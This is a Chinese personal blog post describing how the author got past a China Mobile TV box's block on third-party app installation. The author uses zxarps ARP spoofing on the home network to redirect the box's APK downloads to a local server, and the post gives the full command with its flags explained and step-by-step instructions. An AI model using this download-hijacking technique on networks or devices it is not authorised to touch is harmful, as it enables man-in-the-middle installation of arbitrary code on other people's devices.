---
layout: post
title: Hack移动魔盒，安装第三方应用
tags: [杂文]
---

最近安装了移动电视魔盒，可电视节目很无聊，想着安装个直播软件应用。

可不得不说移动还是很坏的，内置的应用市场里面该有的应用一概没有。我轻视的一笑，这能难道我？找了个U盘，把应用copy进去，再插到盒子上，点开apk安装，动作一气呵成。正当我准备帅气回头的时候，屏幕上跳出一个弹框：不支持第三方应用安装，，，what the f***？？？移动真是太坏了，内置应用少不说，还不让别人安装应用。。。

百度了下，发现并没有太多的解决办法，甚至连改电路板都用上了，至于吗。。。

<br/>

### 问题分析

先来分析下盒子的情况：

- 盒子是Android 定制系统

- 通过内置应用市场，可以安装应用
- 点击主页的某个功能，会先下载APK，并会自动安装
- 通过U盘无法安装
- 定制系统应该是修改了Android的安装api，并有自己的安装api
- 虽然是Android系统，但是无法直接调试它

结论是：盒子通过私有api是可以安装第三方应用的，而原Android的安装api被修改了。

<br/>

### 解决思路

要如何绕过这个限制呢？转换下思路：可不可以Hack魔盒原本要下载的APK文件，替换成要安装的第三方APK呢？这样就不用关心系统定制的问题，反正魔盒会在下载完成后自动安装。

实践证明，这个思路是可行的，借助局域网ARP欺骗来Hack下载的文件地址：

```bash
zxarps.exe -idx 0 -ip 192.168.1.35 -spoofmode 3 -postfix ".apk" -hackurl http://192.168.1.28/apk/ -filename douyu.apk
```

使用`zxarps` 软件，上面的命令中：

- `-ip 192.168.1.35` 表示要欺骗的ip地址，也就是魔盒的ip地址
- `-spoofmode 3` 表示将数据骗发到本机。 1：网关，2：目标机，3：both
- `-postfix ".apk"` 表示关注的文件后缀名
- `-hackurl http://192.168.1.28/apk/` 表示当发现有关注的文件下载时，将url地址修改为这个url
- `-filename douyu.apk` 表示替换后要下载的资源

<br/>

### 具体步骤

更具体的就是：

1. 电脑跟魔盒在一个局域网内。电脑ip是192.168.1.28，魔盒ip是192.168.1.35。
2. 起一个服务器，做hack的第三方应用下载服务器。
3. 下载要安装的第三方应用，放到下载服务器的相应位置。
4. 执行上面的ARP欺骗命令，监听魔盒的文件下载。
5. 在魔盒主页点击某个功能，触发魔盒下载应用。
6. 若一切正常，魔盒会去下载`http://192.168.1.28/apk/douyu.apk`
7. 下载完成之后，魔盒开始自动安装。等安装完成后，在`我的应用`中就能看到第三方应用了。

<br/>

### 参考

[局域网ARP欺骗](https://www.cnblogs.com/xcj26/articles/6073411.html)

[zxarps命令](http://huaidan.org/archives/864.html)